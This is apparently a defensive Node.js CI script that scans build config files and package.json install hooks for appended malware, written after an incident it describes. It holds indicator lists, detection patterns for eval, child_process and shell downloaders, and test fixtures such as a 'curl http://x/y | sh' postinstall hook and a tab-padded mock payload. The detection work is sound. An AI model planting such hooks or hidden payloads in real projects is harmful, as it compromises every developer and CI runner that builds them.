#!/usr/bin/env node
/**
 * Guards the files that execute during `npm install` and `npm run build`.
 *
 * On 2026-09-09 `origin/master` was force-pushed with ~4KB of obfuscated
 * malware appended to Frontend/vite.config.js, on one line, hidden behind a run
 * of tabs. It resolved a C2 address out of an Ethereum transaction, fetched an
 * XOR-encrypted second stage, and ran it through eval() and a detached
 * spawn('node', ['-e', ...]). Vite loads that file, so it executed on every
 * developer's `npm run dev` and on every CI runner that built the frontend.
 * The same thing had happened once before, on 2026-08-26.
 *
 * Matching only that campaign's wallet address would be worth almost nothing —
 * one edited byte defeats it. So the known indicators are just the first of
 * three rules, and the other two describe the *shape* of the attack rather than
 * the instance:
 *
 *   1. Known indicators — exact, free, and catches a lazy repeat.
 *   2. Absurdly long lines — appended payloads are minified onto one line.
 *      Hand-written config is narrow; 500 characters is far past anything a
 *      human writes and far below the ~4KB that showed up here.
 *   3. Constructs with no business in a config file — eval, new Function,
 *      child_process, raw http/https clients. A vite config declares options;
 *      it does not spawn processes or open sockets.
 *
 * Rule 3 is the one that can misfire: a config that shells out to `git` for a
 * build stamp is legitimate. That is what ALLOW is for — an entry there is a
 * deliberate, reviewed exception, not a way to silence the scanner wholesale.
 *
 * Runs standalone: `node .github/scripts/scan-build-config.mjs`
 * Self-checks:     `node .github/scripts/scan-build-config.mjs --selftest`
 */

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';

const SKIP_DIRS = new Set([
    'node_modules', '.git', 'dist', 'build', 'coverage', '.next', '.vite', '.turbo'
]);

/** This file names every indicator it hunts for, so it must not scan itself. */
const SKIP_FILES = new Set(['scan-build-config.mjs']);

const MAX_CONFIG_LINE = 500;

/**
 * Known indicators from the two incidents. The address is split so that this
 * file does not itself match a grep for it during an investigation.
 */
const KNOWN_IOCS = [
    '0x' + 'a322e5f3d311d3080e6f0121063e9adc2490ef1a',
    'x-payload-b64',
    '/0x/cls',
    '/0x/ls',
    'eth_gettransactioncount',
    'blockscout.com/api'
];

const FORBIDDEN = [
    [/\beval\s*\(/, 'eval() call'],
    [/\bnew\s+Function\s*\(/, 'new Function() constructor'],
    [/child_process|\bspawn\s*\(|\bexecFile\s*\(|\bexecSync\s*\(/, 'child process spawn'],
    [/require\s*\(\s*['"]node:(http|https|net|dgram)['"]/, 'raw network client'],
    [/from\s+['"]node:(http|https|net|dgram)['"]/, 'raw network client'],
    [/\batob\s*\(/, 'base64 decode of inline data']
];

/**
 * Reviewed exceptions, as `relative/path.js::rule`. Empty on purpose: nothing
 * in this repo needs one today, and adding one should require explaining why in
 * review.
 */
const ALLOW = new Set([]);

const isConfigFile = (name) =>
    /\.config\.(c|m)?[jt]s$/.test(name) ||
    /^(vite|vitest|rollup|webpack|tailwind|postcss|svelte|next|nuxt|astro)\.config\./.test(name);

/** Files npm or a bundler executes on its own, without anyone opting in. */
const isGuardedFile = (name) => isConfigFile(name) || name === 'package.json';

function* walk(dir) {
    let entries;
    try {
        entries = fs.readdirSync(dir, { withFileTypes: true });
    } catch {
        return;
    }
    for (const entry of entries) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) {
            if (!SKIP_DIRS.has(entry.name)) yield* walk(full);
        } else if (entry.isFile() && !SKIP_FILES.has(entry.name) && isGuardedFile(entry.name)) {
            yield full;
        }
    }
}

/** Lifecycle scripts run automatically on install — the other classic vector. */
const LIFECYCLE = ['preinstall', 'install', 'postinstall', 'prepare', 'prepublish'];
const SHELL_SMELLS = /curl|wget|\bnode\s+-e\b|base64\s+-d|\|\s*(ba)?sh\b|iwr |Invoke-WebRequest/i;

function scanPackageJson(source) {
    const findings = [];
    let pkg;
    try {
        pkg = JSON.parse(source);
    } catch {
        return findings; // not this script's job to police JSON syntax
    }
    for (const hook of LIFECYCLE) {
        const cmd = pkg?.scripts?.[hook];
        if (typeof cmd === 'string' && SHELL_SMELLS.test(cmd)) {
            findings.push({ rule: 'install-hook', detail: `${hook}: ${cmd.slice(0, 120)}`, line: 0 });
        }
    }
    return findings;
}

function scanConfig(source) {
    const findings = [];

    source.split(/\r?\n/).forEach((line, i) => {
        if (line.length > MAX_CONFIG_LINE) {
            findings.push({
                rule: 'long-line',
                detail: `${line.length} characters on one line (limit ${MAX_CONFIG_LINE})`,
                line: i + 1
            });
        }
        for (const [re, label] of FORBIDDEN) {
            if (re.test(line)) findings.push({ rule: 'forbidden-construct', detail: label, line: i + 1 });
        }
    });

    return findings;
}

/** Indicators are hunted in every guarded file, config or not. */
function scanIocs(source) {
    const haystack = source.toLowerCase();
    return KNOWN_IOCS
        .filter((ioc) => haystack.includes(ioc))
        .map((ioc) => ({ rule: 'known-ioc', detail: ioc, line: 0 }));
}

export function scanFile(rel, source) {
    const name = path.basename(rel);
    const findings = [
        ...scanIocs(source),
        ...(name === 'package.json' ? scanPackageJson(source) : scanConfig(source))
    ];
    return findings.filter((f) => !ALLOW.has(`${rel.replace(/\\/g, '/')}::${f.rule}`));
}

export function scanTree(root) {
    const results = [];
    for (const file of walk(root)) {
        const rel = path.relative(root, file).replace(/\\/g, '/');
        const findings = scanFile(rel, fs.readFileSync(file, 'utf8'));
        if (findings.length) results.push({ rel, findings });
    }
    return results;
}

// ─────────────────────────────── self-check ───────────────────────────────

function selftest() {
    const cases = [
        ['vite.config.js', 'export default { plugins: [] };\n', 0, 'a normal config passes'],
        [
            'vite.config.js',
            // Same shape as the real thing: tabs to push the payload off-screen
            // in an editor, then minified code, all on the line that closes the
            // config. Padded past MAX_CONFIG_LINE, as the original was many
            // times over.
            'export default {};' + '\t'.repeat(700) + 'global.i="A8";const u="https://eth.blockscout.com/api";',
            2, // long-line + known-ioc
            'the real payload shape is caught by length and indicator both'
        ],
        [
            'vite.config.js',
            'export default {};\nconst { spawn } = require("child_process");\n',
            1,
            'a config that spawns a process is caught with no known indicator at all'
        ],
        [
            'vite.config.js',
            'export default {};\neval(atob(x));\n',
            2,
            'eval and atob are each reported'
        ],
        [
            'package.json',
            JSON.stringify({ scripts: { postinstall: 'curl http://x/y | sh' } }),
            1,
            'an install hook that pipes the network into a shell is caught'
        ],
        [
            'package.json',
            JSON.stringify({ scripts: { postinstall: 'node ./scripts/setup.js', build: 'vite build' } }),
            0,
            'an ordinary install hook is not flagged'
        ]
    ];

    let failed = 0;
    for (const [name, source, expected, why] of cases) {
        const got = scanFile(name, source).length;
        const ok = got === expected;
        if (!ok) failed += 1;
        console.log(`${ok ? '  ok' : 'FAIL'}  ${why} (expected ${expected}, got ${got})`);
    }

    // It must also survive a real directory tree without crashing, and must not
    // wander into dependencies — those are npm audit's problem, and scanning
    // them would bury a real finding under thousands of false ones.
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'cfgscan-'));
    fs.mkdirSync(path.join(tmp, 'node_modules'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'node_modules', 'vite.config.js'), 'eval(1)');
    fs.writeFileSync(path.join(tmp, 'vite.config.js'), 'export default {};');
    const treeFindings = scanTree(tmp);
    fs.rmSync(tmp, { recursive: true, force: true });
    const skipsNodeModules = treeFindings.length === 0;
    if (!skipsNodeModules) failed += 1;
    console.log(`${skipsNodeModules ? '  ok' : 'FAIL'}  node_modules is left to npm audit`);

    console.log(failed ? `\n${failed} self-check(s) failed` : '\nself-checks passed');
    return failed === 0;
}

// ──────────────────────────────── entrypoint ────────────────────────────────

const thisFile = path.resolve(new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1'));
const invokedDirectly = process.argv[1] && path.resolve(process.argv[1]) === thisFile;

if (invokedDirectly) {
    if (process.argv.includes('--selftest')) {
        process.exit(selftest() ? 0 : 1);
    }

    const results = scanTree(process.cwd());

    if (!results.length) {
        console.log('Build-time config files are clean.');
        process.exit(0);
    }

    console.error('\nSuspicious content in files that execute during install or build:\n');
    for (const { rel, findings } of results) {
        for (const f of findings) {
            console.error(`  ${rel}${f.line ? `:${f.line}` : ''}  [${f.rule}]  ${f.detail}`);
        }
    }
    console.error(`
${results.length} file(s) flagged.

If you made this change yourself it still needs a second pair of eyes: a config
file is executed by every developer and every CI runner, which is exactly why an
attacker puts code there. Add a reviewed exception to ALLOW in this script only
once you know why the construct is present.
`);
    process.exit(1);
}
